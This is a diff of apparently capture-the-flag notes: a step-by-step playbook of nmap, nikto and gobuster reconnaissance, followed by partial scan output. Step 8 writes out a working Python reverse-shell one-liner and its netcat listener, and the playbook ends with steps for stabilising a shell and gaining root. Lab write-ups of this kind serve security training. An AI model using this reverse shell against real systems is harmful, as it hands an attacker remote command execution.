@@ -6,31 +6,51 @@
 
 # Playbook
 
+```
 (Could use hydra, but would be too easy)
 
 1. nmap scan IP address
     - nmap -sC -sV -oN IP
+    - 
 2. Run a nikto scan and log it
    - nikto -h http://IP | tee nikto.log 
    - Check out robots.txt, if it has one
+
+
 3. Run gobuster
    - gobuster -u http://IP -w /opt/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
    - there is a login page 
+
+
 4. Look up source IP 
+
+
 5. Inspect page source code
+
+
 6. Command panel is shown, try out commands
     - grep pattern filename -> grep . file.txt
     - while read line; do echo $line; done < clue.txt
+
+
 7. with a command line, lets set up a reverse shell
    - using python or netcat
    - python3 -c "print('hello')"
+
+
 8. use pentestmonkey to create a reverse shell with
    - pentestmonkey.net
    - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    - nc -lnvp 9999
-9. stabalize reverse shell
+
+
+9.  stabalize reverse shell
    - john hammonds - poor mans pentest -> stabalize_shell3.sh and upload_file_nc.sh
+
+
 10. try to become root and snoop
+
+```
 
 # stabalizing shell
 
@@ -77,8 +97,6 @@ Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmho
 
 3rd ingredients: fleeb juice
 
-
-
 ```
 
 # nmap results
@@ -110,6 +128,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jun 28 01:41:36 2023 -- 1 IP address (1 host up) scanned in 8.33 seconds
+
 ```
 
 # nikto results
@@ -135,6 +154,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 + End Time:           2023-06-28 01:58:17 (GMT1) (9 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
+
 ```
 
 # gobuster results
@@ -165,6 +185,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2023/06/28 02:25:19 Finished
 ===============================================================
+
 ```
 
 # task 1
